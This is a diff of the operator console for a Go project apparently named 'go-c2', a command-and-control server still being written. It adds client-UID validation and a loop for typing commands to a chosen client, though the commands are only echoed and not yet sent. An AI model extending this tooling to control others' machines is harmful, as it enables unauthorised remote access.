@@ -1,20 +1,23 @@
 package main
 
 import (
-    "encoding/gob"
-    "fmt"
-    "net"
-    "bufio"
-    "strings"
-    "go-c2/server/utils"
-    "log"
-    "os"
+	"bufio"
+	"encoding/gob"
+	"fmt"
+	"go-c2/server/utils"
+	"log"
+	"net"
+	"os"
+	"regexp"
+	"strings"
 )
 
 const help = `help -> shows help
 showClients -> shows connected available clients
 exit -> exits the server
 `
+
+var isUid = regexp.MustCompile(`[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}`).MatchString
 
 // Function that handles the registration phase
 func handleRegister(conn net.Conn, server *utils.Server, logger *utils.Logger) {
@@ -33,19 +36,12 @@ func handleRegister(conn net.Conn, server *utils.Server, logger *utils.Logger) {
     server.SendConfirmationMessageToClient(client, logger)
 }
 
+// DOING: Function to execute commands on client
+func execCommand(input string, clientUid string, logger *utils.Logger) int{
+    for {
 
-// Function to use a client to send commands
-func useClient(input string, logger *utils.Logger) {
-    //TODO: send command to client
-    // use <client id>
-    // if back exit this, otherwise its an infinite loop here
-  for {
-        if len(strings.Split(input, " ")) == 1 {
-            fmt.Println("Please provide the client id to execute commands")
-            break
-        }
         reader := bufio.NewReader(os.Stdin)
-        fmt.Printf("\ncommand in client > ")
+        fmt.Printf("\ncommand in client (%s) > ", clientUid)
         commandToClient, err := reader.ReadString('\n')
         commandToClient = strings.TrimSpace(commandToClient)
 
@@ -53,13 +49,40 @@ func useClient(input string, logger *utils.Logger) {
             logger.ErrorLogger.Println("Error while reading the user input")
             break
         } else {
-            // TODO: verify if the client exists in db and send the command and wait for the response
             if commandToClient == "back" {
-                break
+                return 1
             } else {
-                fmt.Println("Sent " + commandToClient + " to client")
+                fmt.Printf("Sent %s to client\n", commandToClient)
             }
         }
+    }
+
+    return 0
+}
+
+
+// Function to use a client to send commands
+func useClient(input string, logger *utils.Logger) {
+  for {
+        if len(strings.Split(input, " ")) == 1 {
+            fmt.Println("Please provide the client id to execute commands")
+            break
+        }
+
+        clientUid := strings.Split(input, " ")[1]
+
+        if isUid(clientUid) {
+            if err := utils.CheckClientExistence(clientUid); err != nil {
+                logger.ErrorLogger.Printf("Failed while trying to CheckClientExistence %s\n", err)
+            }
+        } else {
+            fmt.Println("This is not a valid Uid for a client")
+        }
+
+        if execCommand(input, clientUid, logger) == 1 {
+            break
+        }
+
     }
 }
 
